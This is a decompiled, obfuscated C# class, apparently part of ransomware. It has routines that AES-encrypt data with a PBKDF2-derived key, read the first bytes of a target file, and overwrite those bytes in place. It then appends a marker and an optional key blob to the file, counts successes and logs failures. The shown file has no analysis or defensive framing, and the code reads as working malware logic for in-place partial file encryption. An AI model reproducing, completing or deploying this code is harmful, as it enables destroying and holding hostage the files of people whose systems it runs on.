using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace bpbWYHKNCNX;

public static class UcPQEhwbPwt
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] PeZryOJEgIE(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = wEwOGzKvrGVHB(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes wEwOGzKvrGVHB(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] RfngZyLuPZaRn(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (xWcMxnuhDQYJl.SphVOVZCYpOX == getString_0(107396904))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (xWcMxnuhDQYJl.fvDSfFEVAaG)
			{
				try
				{
					File.AppendAllText(xWcMxnuhDQYJl.qiQAhhXEbdwvY, getString_0(107390567) + string_0 + getString_0(107404207) + ex.Message + getString_0(107396434));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool vTfgqKCmDAm(string GnufvwgpIEeUa, byte[] VilQxGdSKPVC, byte[] BbSyJXSIaCTuyKp = null)
	{
		try
		{
			byte[] array = null;
			if (xWcMxnuhDQYJl.SphVOVZCYpOX == getString_0(107396904))
			{
				array = (xWcMxnuhDQYJl.ikJhDajEXzE ? Encoding.ASCII.GetBytes(xWcMxnuhDQYJl.QqgSuZNWThrmn(xWcMxnuhDQYJl.RjbbgSfRIRAObTU) + xWcMxnuhDQYJl.QqgSuZNWThrmn(getString_0(107404149)) + Convert.ToString(xWcMxnuhDQYJl.qpeehHsICuPA) + xWcMxnuhDQYJl.QqgSuZNWThrmn(getString_0(107404149))) : Encoding.ASCII.GetBytes(xWcMxnuhDQYJl.QqgSuZNWThrmn(xWcMxnuhDQYJl.RjbbgSfRIRAObTU) + xWcMxnuhDQYJl.QqgSuZNWThrmn(getString_0(107404126)) + Convert.ToString(xWcMxnuhDQYJl.qpeehHsICuPA) + xWcMxnuhDQYJl.QqgSuZNWThrmn(getString_0(107404126))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(GnufvwgpIEeUa, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(VilQxGdSKPVC, 0, VilQxGdSKPVC.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(GnufvwgpIEeUa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!xWcMxnuhDQYJl.ikJhDajEXzE)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(BbSyJXSIaCTuyKp, 0, BbSyJXSIaCTuyKp.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (xWcMxnuhDQYJl.ikJhDajEXzE ? Encoding.ASCII.GetBytes(xWcMxnuhDQYJl.QqgSuZNWThrmn(xWcMxnuhDQYJl.RjbbgSfRIRAObTU) + xWcMxnuhDQYJl.QqgSuZNWThrmn(getString_0(107404149)) + Convert.ToString(xWcMxnuhDQYJl.qpeehHsICuPA) + xWcMxnuhDQYJl.QqgSuZNWThrmn(getString_0(107404149))) : Encoding.ASCII.GetBytes(xWcMxnuhDQYJl.QqgSuZNWThrmn(xWcMxnuhDQYJl.RjbbgSfRIRAObTU) + xWcMxnuhDQYJl.QqgSuZNWThrmn(getString_0(107404126)) + Convert.ToString(xWcMxnuhDQYJl.qpeehHsICuPA) + xWcMxnuhDQYJl.QqgSuZNWThrmn(getString_0(107404126))));
				FileStream fileStream2 = new FileStream(GnufvwgpIEeUa, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(VilQxGdSKPVC, 0, VilQxGdSKPVC.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(GnufvwgpIEeUa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!xWcMxnuhDQYJl.ikJhDajEXzE)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(BbSyJXSIaCTuyKp, 0, BbSyJXSIaCTuyKp.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			xWcMxnuhDQYJl.DcpSoxMogYW++;
		}
		catch (Exception ex)
		{
			if (xWcMxnuhDQYJl.fvDSfFEVAaG)
			{
				try
				{
					File.AppendAllText(xWcMxnuhDQYJl.qiQAhhXEbdwvY, getString_0(107390567) + GnufvwgpIEeUa + getString_0(107404140) + ex.Message + getString_0(107396434));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (xWcMxnuhDQYJl.ikJhDajEXzE ? Encoding.ASCII.GetBytes(xWcMxnuhDQYJl.QqgSuZNWThrmn(xWcMxnuhDQYJl.RjbbgSfRIRAObTU) + xWcMxnuhDQYJl.QqgSuZNWThrmn(getString_0(107404149)) + Convert.ToString(xWcMxnuhDQYJl.qpeehHsICuPA) + xWcMxnuhDQYJl.QqgSuZNWThrmn(getString_0(107404149))) : Encoding.ASCII.GetBytes(xWcMxnuhDQYJl.QqgSuZNWThrmn(xWcMxnuhDQYJl.RjbbgSfRIRAObTU) + xWcMxnuhDQYJl.QqgSuZNWThrmn(getString_0(107404126)) + Convert.ToString(xWcMxnuhDQYJl.qpeehHsICuPA) + xWcMxnuhDQYJl.QqgSuZNWThrmn(getString_0(107404126))));
				FileStream fileStream4 = new FileStream(GnufvwgpIEeUa, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(VilQxGdSKPVC, 0, VilQxGdSKPVC.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(GnufvwgpIEeUa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!xWcMxnuhDQYJl.ikJhDajEXzE)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(BbSyJXSIaCTuyKp, 0, BbSyJXSIaCTuyKp.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static UcPQEhwbPwt()
	{
		Strings.CreateGetStringDelegate(typeof(UcPQEhwbPwt));
	}
}
